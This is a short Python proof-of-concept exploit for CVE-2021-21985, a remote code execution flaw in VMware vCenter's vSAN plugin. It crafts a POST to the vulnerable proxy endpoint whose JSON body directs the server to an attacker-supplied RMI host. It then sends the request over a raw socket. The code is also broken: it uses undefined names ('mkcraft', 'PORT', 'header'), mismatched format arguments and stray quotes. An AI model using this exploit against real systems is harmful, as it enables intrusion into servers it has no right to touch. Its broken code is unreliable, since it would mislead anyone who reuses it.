#!/usr/bin/env python3
# CVE-2021-21985: vmware 6.7-9.8 RCE
# Author Dario Clavijo 2021
# Attribution https://github.com/alt3kx/CVE-2021-21985_PoC
import socket
import sys

def makerequest(host, attacker, payload):

    headers = """POST %s HTTP/1.1
Host: %s
User-Agent: alex666' 
Content-Type: application/json'
Connection: close
Content-Length: %d

%s"""

    cmd = '{"methodInput":[["rmi://%s/%s"]]}' % payload
    url = 'https://%s/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setArguments' % host
    
    return header % (url,host,cmd,len(cmd))

def main():
    HOST = sys.argv[1]
    attacker = sys.argv[2]
    payload = sys.argv[3]
    crafted = mkcraft(HOST, attacker, payload)


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print('Connected by', HOST)
        s.send(crafted.encode("utf-8"))
        print("Sent:")
        print(crafted)
        while True:
            print("Recv:")
            data = s.recv(512).decode("utf-8")
            print(data)
            if not data:
               break


if __name__ == "__main__":
    main()

